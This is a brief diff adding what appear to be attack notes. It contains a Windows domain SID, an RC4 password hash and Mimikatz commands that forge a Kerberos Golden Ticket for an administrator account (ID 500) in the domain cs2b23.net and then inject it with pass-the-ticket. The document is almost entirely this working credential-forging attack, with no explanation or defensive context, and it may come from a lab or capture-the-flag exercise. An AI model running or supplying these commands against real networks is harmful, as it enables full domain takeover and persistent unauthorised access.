@@ -1,0 +1,9 @@
+S-1-5-21-1101470987-2015192894-423010698
+
+
+28e9abd038842dace3d1fe10368ab7ef
+
+kerberos::golden /domain:cs2b23.net /sid:S-1-5-21-1101470987-2015192894-423010698 /rc4:28e9abd038842dace3d1fe10368ab7ef /id:500 /user:john
+
+
+kerberos::ptt ticket.kirbi
